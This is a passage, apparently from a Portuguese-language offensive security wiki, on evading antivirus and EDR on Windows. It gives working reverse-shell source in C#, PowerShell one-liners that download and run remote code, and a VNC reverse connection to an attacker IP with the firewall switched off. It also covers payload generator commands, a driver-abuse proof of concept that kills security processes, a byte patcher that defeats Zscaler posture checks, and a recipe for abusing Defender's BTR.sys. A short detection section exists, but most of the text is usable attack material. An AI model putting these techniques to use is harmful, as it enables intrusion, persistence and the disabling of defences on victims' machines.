Em vez de mascarar um implant inteiro apenas enquanto ele dorme, um backend LLVM X86 modificado pode manter funções selecionadas mascaradas com XOR sempre que estiverem inativas. O PoC Function Peekaboo seleciona nomes demangled contendo `REG_`, injeta stubs de entrada/saída independentes de posição ao redor do código de máquina final e emite um handler de masking compartilhado em `.text`; as assinaturas no nível do código-fonte e a calling convention do Windows x64 permanecem inalteradas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformação de fluxo de controle no backend

Isso deve ocorrer após a seleção de instruções e a otimização, pois a transformação precisa abranger **cada retorno emitido** e conhecer o layout exato do x86. Um `MachineFunctionPass` pré-emissão encontra o último `MachineInstr::isReturn()`, exclui-o para que o caminho final continue até o epílogo anexado e substitui os retornos anteriores por `JMP_1 handler`. Mantenha qualquer desmontagem de stack/frame gerada pelo compilador antes de cada retorno; redirecione somente a própria instrução de retorno.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `X86AsmPrinter::emitFunctionBodyEnd()` emitem os stubs por função, enquanto `emitEndOfAsmFile()` emite o handler. Símbolos compartilhados entre os estágios de emissão permitem que um branch do prólogo aponte para seu epílogo posterior; para um `je` near emitido manualmente, escreva `0F 84` seguido pela expressão MC de quatro bytes `target - address_after_je`. Calls e jumps para o handler também podem ser emitidos como objetos `MCInst` (`CALL64pcrel32` e `JMP_1`). Um pass deve retornar `false` para uma função não selecionada quando não tiver alterado nada; o PoC retorna incorretamente `true` nesse caminho.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadados e inicialização pré-CRT

O PoC coloca uma chave XOR e registros de 16 bytes contendo um ponteiro de função relocado pelo loader, além de um tamanho em runtime, em `.funcmeta`. Embora o campo C seja um `uint32_t`, o handler acessa um QWORD no offset `+8` do registro, consumindo o tamanho e seu padding, e avança os registros em `0x10`. Os nomes de seção PE ocupam apenas oito bytes, portanto a busca em runtime encontra `.funcmet`. Um patcher externo adiciona um `.stub` executável, salva o RVA do entry point antigo no stub e redireciona `AddressOfEntryPoint`; o stub PIC obtém a image base de `gs:[0x60]` → `[PEB+0x10]`, percorre as importações PE32+ para resolver uma `VirtualProtect` já importada e executa antes do CRT.<sup>[[38]](#references)[[39]](#references)</sup>

A inicialização define um sentinel em `gs:[0xE8]` e chama cada função dos metadados. Seu prólogo permanentemente legível registra o início da função em `gs:[0xF0]`, detecta o sentinel e ignora o corpo ainda limpo. O epílogo então usa `call handler`; depois que o handler salva 13 registradores (`0x68` bytes), o endereço de retorno em `[rsp+0x68]` corresponde ao fim da função transformada, portanto `end - start` pode ser gravado em seu registro de metadados. O stub limpa o sentinel e salta para `ImageBase + original_entry_point_RVA` depois que todos os corpos foram mascarados.<sup>[[38]](#references)[[39]](#references)</sup>

Durante uma call normal, o prólogo chama o mesmo handler simétrico para decodificar o corpo. O caminho final continua até o epílogo anexado, enquanto cada retorno anterior salta diretamente para o handler compartilhado. O epílogo normal também usa `jmp handler` em vez de `call`, portanto, após a remasking, o `ret` do handler consome o endereço de retorno do caller original e preserva o resultado da função em `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva de masking e indicadores de análise

O handler encontra o registro atual, ignora o prólogo visível fixo (`0x46` bytes nesta build), altera o restante para `PAGE_EXECUTE_READWRITE`, aplica XOR byte a byte usando o byte inferior da chave e então define o restante como `PAGE_EXECUTE_READ`. Assim, o mesmo loop decodifica na entrada e codifica em cada saída normal.<sup>[[38]](#references)[[39]](#references)</sup>

Indicadores de alto sinal para esse design incluem:<sup>[[38]](#references)[[39]](#references)</sup>

- um entry point dentro de um `.stub` executável e uma seção `.funcmet` contendo uma chave e ponteiros relocados para `.text`;
- análise pré-CRT do PEB, da import table e da section table, seguida de calls por meio de cada ponteiro dos metadados;
- prólogos PIC idênticos com `call`/`pop` e muitos pontos de retorno redirecionados para um único handler;
- gravações em `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguidas por transições repetidas de `VirtualProtect` e gravações XOR byte a byte em páginas executáveis apoiadas pela image.

Isso é evasão de memory scanner, não proteção criptográfica: o arquivo modificado ainda contém o corpo original em claro, e um debugger pode parar em `VirtualProtect` ou no loop XOR e fazer dump da função ativa. O XOR de um único byte, os metadados legíveis e o limite fixo `0x46` também tornam a recuperação offline simples.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Os slots do TEB do PoC são locais à thread, mas as páginas de código modificadas são globais ao processo. Entradas concorrentes ou recursivas podem, portanto, alternar novamente as instruções enquanto outra invocação está em execução; exceções e saídas não locais também podem ignorar a remasking. Uma implementação robusta deve sincronizar as transições, restaurar a proteção realmente retornada por `lpflOldProtect`, evitar comprimentos de stub hard-coded, auditar os caminhos `call` e `jmp` quanto ao alinhamento da stack x64 e chamar `FlushInstructionCache` após reescrever bytes executáveis. A Microsoft afirma explicitamente que o caller é responsável pela coerência do instruction cache quando código executável é modificado.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

O Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações baixadas com pouca frequência acionarão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em More Info -> Run anyway).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier, criado automaticamente ao baixar arquivos da internet, juntamente com a URL da qual ele foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier de um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante observar que executáveis assinados com um certificado de assinatura **confiável** **não acionarão o SmartScreen**.

Uma maneira muito eficaz de impedir que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de container, como um ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **que não sejam NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em containers de saída para evadir o Mark-of-the-Web.

Exemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aqui está uma demonstração de bypass do SmartScreen empacotando payloads dentro de arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, ele também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Assim como o AMSI é desabilitado (bypassed), também é possível fazer com que a função **`EtwEventWrite`** do processo em user space retorne imediatamente sem registrar nenhum evento. Isso é feito aplicando um patch na função em memória para que ela retorne imediatamente, desabilitando efetivamente o logging do ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

O carregamento de binários C# em memória é conhecido há bastante tempo e ainda é uma ótima maneira de executar suas ferramentas de post-exploitation sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória sem tocar no disco, teremos apenas que nos preocupar em aplicar um patch no AMSI para todo o processo.

A maioria dos frameworks de C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc etc.) já oferece a capacidade de executar assemblies C# diretamente na memória, mas existem diferentes maneiras de fazer isso:

- **Fork\&Run**

Isso envolve **iniciar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar seu código malicioso e, quando terminar, encerrar o novo processo. Isso tem benefícios e desvantagens. O benefício do método fork and run é que a execução ocorre **fora do processo do nosso Beacon implantado**. Isso significa que, se algo der errado ou for detectado durante nossa ação de post-exploitation, há uma **chance muito maior** de nosso **implant sobreviver.** A desvantagem é que existe uma **chance maior** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **em seu próprio processo**. Dessa forma, você pode evitar ter que criar um novo processo e fazer com que ele seja analisado pelo AV, mas a desvantagem é que, se algo der errado durante a execução do seu payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode sofrer um crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se quiser ler mais sobre o carregamento de C# Assembly, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o InlineExecute-Assembly BOF deles ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar C# Assemblies **a partir do PowerShell**; confira o [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o [vídeo do S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Usando Outras Linguagens de Programação

Conforme proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens, dando à máquina comprometida acesso **ao ambiente do interpretador instalado no Attacker Controlled SMB share**.

Ao permitir acesso aos Interpreter Binaries e ao ambiente no SMB share, você pode **executar código arbitrário nessas linguagens dentro da memória** da máquina comprometida.

O repositório indica: o Defender ainda verifica os scripts, mas, utilizando Go, Java, PHP etc., temos **mais flexibilidade para realizar bypass de assinaturas estáticas**. Testes com scripts de reverse shell aleatórios e não obfuscados nessas linguagens foram bem-sucedidos.

## TokenStomping

Token stomping manipula o access token de um produto de segurança, como um EDR ou AV. Reduzir os privilégios do token pode manter o processo em execução e, ao mesmo tempo, impedi-lo de realizar ações privilegiadas de inspeção ou remediation.

Para evitar isso, o Windows poderia **impedir processos externos** de obter handles sobre os tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Usando Software Confiável

### Chrome Remote Desktop

Conforme descrito [**nesta publicação de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil simplesmente implantar o Chrome Remote Desktop no PC da vítima e então usá-lo para assumir o controle e manter a persistência:<sup>[[35]](#references)</sup>
1. Baixe a partir de https://remotedesktop.google.com/, clique em "Set up via SSH" e, em seguida, clique no arquivo MSI do Windows para baixar o arquivo MSI.
2. Execute o instalador silenciosamente na vítima (é necessário ser admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte à página do Chrome Remote Desktop e clique em next. O wizard solicitará que você autorize; clique no botão Authorize para continuar.
4. Execute o comando fornecido com os ajustes necessários: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (o parâmetro `--pin` define o PIN sem usar a GUI).


## Advanced Evasion

Evasion é um tópico muito complicado; às vezes, é necessário levar em conta muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível permanecer completamente indetectado em ambientes maduros.

Cada ambiente contra o qual você atuar terá seus próprios pontos fortes e fracos.

Recomendo fortemente que você assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94) para obter uma base sobre técnicas mais avançadas de Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta também é outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas Antigas**

### **Verificar quais partes o Defender identifica como maliciosas**

Você pode usar o [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **removerá partes do binário** até **descobrir qual parte o Defender** está identificando como maliciosa e a separará para você.\
Outra ferramenta que faz a **mesma coisa é o** [**avred**](https://github.com/dobin/avred), com uma oferta web aberta do serviço em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Até o Windows10, todos os Windows vinham com um **servidor Telnet** que você podia instalar (como administrador) executando:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute-o** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar a porta do telnet** (stealth) e desativar o firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Faça o download em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads binários, não o setup)

**NO HOST**: Execute _**winvnc.exe**_ e configure o server:

- Ative a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **UltraVNC.ini** **recém-criado** para dentro da **vítima**

#### **Reverse connection**

O **atacante** deve **executar dentro** de seu **host** o binário `vncviewer.exe -listen 5900`, para que ele fique **preparado** para receber uma **conexão VNC** reversa. Em seguida, dentro da **vítima**: Inicie o daemon winvnc com `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVISO:** Para manter o stealth, você não deve fazer algumas coisas

- Não inicie o `winvnc` se ele já estiver em execução, ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se ele está em execução com `tasklist | findstr winvnc`
- Não inicie o `winvnc` sem o `UltraVNC.ini` no mesmo diretório, ou isso fará com que [a janela de configuração](https://i.imgur.com/rfMQWcf.png) seja aberta
- Não execute `winvnc -h` para obter ajuda, ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Faça o download em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **payload xml** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O Defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando o compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscators de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando Python para criar injectors - exemplo:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR a partir do Kernel Space

Storm-2603 utilizou um pequeno utilitário de console conhecido como **Antivirus Terminator** para desativar as proteções dos endpoints antes de implantar ransomware. A ferramenta traz seu **próprio driver vulnerável, mas *assinado***, e abusa dele para emitir operações privilegiadas no kernel que nem mesmo os serviços AV Protected-Process-Light (PPL) conseguem bloquear.<sup>[[12]](#references)</sup>

Principais pontos
1. **Driver assinado**: o arquivo entregue ao disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys`, do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele é carregado mesmo quando o Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalação do serviço**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **kernel service** e a segunda o inicia, fazendo com que `\\.\ServiceMouse` fique acessível a partir do user land.
3. **IOCTLs expostos pelo driver**
| Código IOCTL | Capacidade                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Termina um processo arbitrário por PID (usado para eliminar serviços do Defender/EDR) |
| `0x990000D0` | Exclui um arquivo arbitrário do disco |
| `0x990001D0` | Descarrega o driver e remove o serviço |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por que funciona**: o BYOVD ignora completamente as proteções em user-mode; o código executado no kernel pode abrir processos *protegidos*, encerrá-los ou adulterar objetos do kernel, independentemente de PPL/PP, ELAM ou outros recursos de hardening.

Detecção / Mitigação
•  Habilite a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows se recuse a carregar `AToolsKrnl64.sys`.
•  Monitore a criação de novos serviços do *kernel* e gere alertas quando um driver for carregado a partir de um diretório com permissão de escrita para todos ou não estiver presente na allow-list.
•  Monitore handles em user-mode para objetos de dispositivo personalizados, seguidos de chamadas suspeitas a `DeviceIoControl`.

### Ignorando as verificações de Posture do Zscaler Client Connector por meio de patching do binário no disco

O **Client Connector** da Zscaler aplica regras de device-posture localmente e depende do Windows RPC para comunicar os resultados a outros componentes. Duas escolhas de design frágeis tornam possível um bypass completo:

1. A avaliação de posture ocorre **inteiramente no lado do cliente** (um booleano é enviado ao servidor).
2. Os endpoints RPC internos validam apenas se o executável conectado é **assinado pela Zscaler** (por meio de `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Ao fazer **patching de quatro binários assinados no disco**, ambos os mecanismos podem ser neutralizados:

| Binário | Lógica original modificada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, portanto todas as verificações são consideradas conformes |
| `ZSAService.exe` | Chamada indireta a `WinVerifyTrust` | Substituída por NOP ⇒ qualquer processo (até mesmo não assinado) pode se conectar aos named pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituída por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade do tunnel | Desviadas |

Trecho mínimo do patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Após substituir os arquivos originais e reiniciar a stack de serviços:

* **Todas** as verificações de postura exibem **verde/em conformidade**.
* Binaries não assinados ou modificados podem abrir os endpoints RPC de named pipe (por exemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido obtém acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e simples verificações de assinatura podem ser derrotadas com alguns patches de bytes.

## Abuso da funcionalidade confiável do Microsoft Defender `BTR.sys`

O driver **Boot-Time Removal** do Defender é um contraexemplo útil ao BYOVD clássico. `BTR.sys` é um componente legítimo de remediation assinado pela Microsoft, sem bug de corrupção de memória e sem interface IOCTL; após obter acesso de administrador e `SeLoadDriverPrivilege`, um operador pode, em vez disso, forjar sua transação privada de remediation e obter as operações pretendidas de arquivos/registro no Ring-0. Este é um **primitive de neutralização de AV/EDR pós-comprometimento, não de acesso inicial ou escalada de privilégios**, e o driver pode ser extraído do próprio recurso `BOOTTIMETOOL` de `MpEngine.dll` do alvo, em vez de importar um driver de terceiros conspícuo.<sup>[[36]](#references)</sup>

### Preparando o driver de execução única

Normalmente, o Defender grava o recurso como um arquivo `[a-z]{8}.sys` aleatório e registra um serviço de kernel com nome semelhante. `DriverEntry` lê o valor `Args` do serviço, abre o NTFS ADS referenciado, descriptografa e valida a lista de ações, grava o feedback e retorna `0xC0000056` (`STATUS_DELETE_PENDING`) após a execução bem-sucedida, para que o driver seja descarregado em vez de permanecer residente. Um serviço forjado apresenta os seguintes valores característicos.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
O stream `:changelist` contém um blob criptografado com RC4. As builds analisadas reutilizam uma chave fixa de 256 bytes, portanto a criptografia não é uma fronteira de autorização. Um plaintext válido possui um cabeçalho global de 24 bytes (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC do cabeçalho e um ID de transação derivado do payload), seguido por um caminho de feedback UTF-16 terminado em nulo e qualquer número de itens. Cada item possui um cabeçalho de 16 bytes (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) e dados específicos da action terminados em **exatamente quatro bytes NUL**. Cada região de cabeçalho/dados é verificada independentemente com o polinômio CRC-32 `0xEDB88320`, estado inicial `0xFFFFFFFF` e **sem XOR final** (`~CRC32`); o estado do CRC é redefinido para cada região.<sup>[[36]](#references)[[37]](#references)</sup>

Os IDs de action aceitos expõem estas primitivas do kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dados do item | Resultado |
| --- | --- | --- |
| 1 | `[caminho UTF-16]` | Excluir um arquivo, incluindo um arquivo bloqueado |
| 2 | `[caminho UTF-16]` | Remover um diretório vazio |
| 3 | `[Flags][origem][destino]` | Mover um arquivo para um caminho protegido escolhido pelo atacante; um destino vazio significa excluir |
| 4 | `[Flags][caminho da chave]` | Excluir recursivamente uma chave do registro |
| 5 | `[Flags][caminho da chave + "\\" + valor]` | Excluir um valor do registro |
| 6 | `[Flags][tipo][tamanho][caminho da chave + "\\" + valor][dados]` | Criar/atualizar um valor do registro e criar os caminhos de chave ausentes |

Para as actions 5 e 6, o separador de chave/valor no wire são **duas barras invertidas consecutivas**; um caminho formatado convencionalmente não será dividido corretamente. O arquivo de feedback reflete principalmente a solicitação, mas os primeiros quatro bytes de dados de cada item tornam-se seu `NTSTATUS` resultante. Para as actions 1 e 2, que não possuem um campo de flags inicial, o BTR desloca o caminho para os quatro bytes finais reservados a fim de abrir espaço para esse status.<sup>[[36]](#references)</sup>

### Fluxo de trabalho do `BTR_CLI` e janela de early-boot

